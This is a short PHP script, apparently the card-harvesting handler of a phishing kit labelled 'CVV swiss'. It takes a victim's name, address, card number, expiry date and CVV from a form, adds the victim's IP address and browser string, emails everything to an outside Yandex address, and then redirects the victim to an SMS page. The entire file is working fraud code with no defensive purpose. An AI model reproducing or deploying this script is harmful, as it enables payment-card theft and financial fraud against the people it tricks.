<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ CVV swiss ]-----++--\n";
$message .= "-------------- BY adem -----\n";
$message .= "first name : ".$_POST['fname']."\n";
$message .= "last name : ".$_POST['lname']."\n";
$message .= "address : ".$_POST['adress']."\n";
$message .= "state : ".$_POST['state']."\n";
$message .= "zip : ".$_POST['zip']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp date : ".$_POST['exp']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------BY Adem  ----------------------\n";
$subject = "CVV swiss [ " . $zabi . " ] ";
$email = "ahriche123@yandex.com";
mail($email,$subject,$message);
   

header("Location: ../sms/");?>